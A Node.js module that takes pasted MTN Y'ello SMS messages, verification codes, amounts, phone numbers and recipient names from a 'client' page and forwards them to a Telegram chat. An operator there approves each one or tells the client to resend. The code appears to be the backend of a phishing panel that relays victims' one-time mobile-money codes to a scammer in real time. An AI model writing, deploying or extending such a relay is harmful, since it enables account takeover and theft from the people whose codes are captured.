// telegram-mtn.js
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || '';

const pending = new Map(); // ref -> { decision, messageId, smsText, createdAt }

function log(m) { console.log('[tg-mtn]', m); }

async function sendTelegramMessage(text, keyboard) {
  if (!BOT_TOKEN || !CHAT_ID) throw new Error('Telegram not configured.');
  const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text,
      parse_mode: 'HTML',
      disable_web_page_preview: true,
      reply_markup: keyboard ? { inline_keyboard: keyboard } : undefined
    })
  });
  const data = await res.json();
  if (!data.ok) throw new Error('Telegram send failed: ' + (data.description || 'unknown'));
  return data.result;
}

async function answerCallback(cqId, text) {
  if (!BOT_TOKEN) return;
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ callback_query_id: cqId, text, show_alert: false })
  }).catch(() => {});
}

async function clearButtons(messageId) {
  if (!BOT_TOKEN || !CHAT_ID) return;
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: CHAT_ID, message_id: messageId, reply_markup: { inline_keyboard: [] } })
  }).catch(() => {});
}

/* Called by the server.js dispatcher for approve:/paste_full:/expired: */
async function handleUpdate(update) {
  const cq = update && update.callback_query;
  if (!cq) return;
  const data = cq.data || '';
  const [action, txRef] = data.split(':');
  if (!action || !txRef) return;

  // Only handle our three actions
  if (action !== 'approve' && action !== 'paste_full' && action !== 'expired') return;

  const entry = pending.get(txRef);
  if (!entry) {
    await answerCallback(cq.id, 'Request already handled.');
    return;
  }
  if (entry.decision !== 'pending') {
    await answerCallback(cq.id, 'Already ' + entry.decision + '.');
    return;
  }

  if (action === 'approve') {
    entry.decision = 'approved';
    await answerCallback(cq.id, '✅ Approved — client continues.');
  } else if (action === 'paste_full') {
    entry.decision = 'paste_full';
    await answerCallback(cq.id, '⚠ Client told to paste the full SMS.');
  } else if (action === 'expired') {
    entry.decision = 'expired';
    await answerCallback(cq.id, '⏱ Client told SMS expired — resend.');
  }
  log(`tx ${txRef} → ${entry.decision}`);
  const messageId = cq.message && cq.message.message_id;
  if (messageId) await clearButtons(messageId);
}

function registerRoutes(app) {
  app.post('/api/verification/sms', async (req, res) => {
    try {
      const { tx, code, message, am, cur, c, an, rn } = req.body || {};
      if (!tx || !message) return res.status(400).json({ error: 'Missing tx or message' });

      const existing = pending.get(tx);
      if (existing && existing.decision === 'pending') {
        return res.json({ ok: true, requestId: tx });
      }

      pending.set(tx, { decision: 'pending', messageId: null, smsText: message, createdAt: Date.now() });

      const safe = (v) => String(v == null ? '—' : v)
        .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');

      const text =
        `<b>📨 New MTN Y'ello SMS submitted</b>\n\n` +
        `<b>Reference:</b> <code>${safe(tx)}</code>\n` +
        `<b>Amount:</b> ${safe(cur)} ${safe(am)}\n` +
        `<b>Country:</b> ${safe(c)}\n` +
        `<b>Number:</b> ${safe(an)}\n` +
        `<b>Recipient:</b> ${safe(rn)}\n` +
        `<b>Detected code:</b> <code>${safe(code)}</code>\n\n` +
        `<b>Pasted SMS:</b>\n<pre>${safe(message)}</pre>`;

      // ← THE KEY FIX: plain prefixes that match handleUpdate
      const keyboard = [[
        { text: '✅ Approve',        callback_data: `approve:${tx}` },
        { text: '⚠️ Paste full SMS', callback_data: `paste_full:${tx}` },
        { text: '⏱ SMS expired',     callback_data: `expired:${tx}` }
      ]];

      const sent = await sendTelegramMessage(text, keyboard);
      const e = pending.get(tx);
      if (e) e.messageId = sent.message_id;

      log(`SMS submitted for ${tx}`);
      res.json({ ok: true, requestId: tx });
    } catch (err) {
      console.error('[tg-mtn] send error', err);
      res.status(500).json({ error: 'Telegram send failed' });
    }
  });

  app.get('/api/verification/sms-status/:ref', (req, res) => {
    const entry = pending.get(req.params.ref);
    if (!entry) return res.json({ decision: 'pending' });
    res.json({ decision: entry.decision });
  });

  log('Routes: /api/verification/sms, /api/verification/sms-status/:ref');
}

module.exports = { registerRoutes, handleUpdate };
